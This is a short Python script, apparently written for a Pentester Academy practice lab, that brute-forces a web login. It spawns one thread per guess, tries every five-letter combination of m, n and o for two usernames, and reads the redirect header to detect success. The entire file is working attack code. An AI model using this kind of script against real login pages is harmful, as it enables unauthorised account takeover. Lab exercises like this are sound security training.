import requests
from itertools import combinations, product
import base64
import threading

# url = "https://attack.samsclass.info/basic0/"
# url = "https://pentesteracademylab.appspot.com/lab/webapp/1"
url = "http://pentesteracademylab.appspot.com/lab/webapp/auth/1/login"
# url = "https://pentesteracademylab.appspot.com/lab/webapp/auth/1/loginscript?email=123%40gmail.com&password=123"

proxy = {
    "http" : "127.0.0.1:8080"
}
credentials = {
    "email": "admin@pentesteracademy.com",
    "password": "zzzxy"
}
# response = requests.get(url, params = credentials)

# auths = requests.auth.HTTPBasicAuth("root", "password")
response = requests.head(url)#, auth = auths)
# print(response.headers)

# print(response.headers)


def generatePass(characters, length):
    return list(product(characters, repeat=length))

passList = generatePass(["m", "n", "o"], 5)
usernameList = ["nick@pentesteracademy.com", "admin@pentesteracademy.com"]


def attemptAccount(username, passStrings):
    AttemptPass = "".join(passStrings)

    credentials = {
        "email": username+"@pentesteracacdemy.com",
        "password": AttemptPass
    }

    link1 = "http://pentesteracademylab.appspot.com/lab/webapp/auth/1/loginscript?email=" + username + "&password=" + AttemptPass

    response = requests.head(link1)
    redirect = response.headers['location']
    if (redirect == url):
        print(f"[{username}, {AttemptPass}]: Failed\n")
    else:
        print(f"[{username}, {AttemptPass}]: Successfullyyyyyyy\n")
        exit(1)

def bruteforcePass(username, passList):
    for passStrings in passList:
        thread = threading.Thread(target=attemptAccount, args=(username, passStrings))
        thread.start()

def bruteforceAccount(usernameList, passList):
    for username in usernameList:
        thread = threading.Thread(target=bruteforcePass, args=(username, passList))
        thread.start()

bruteforceAccount(usernameList, passList)

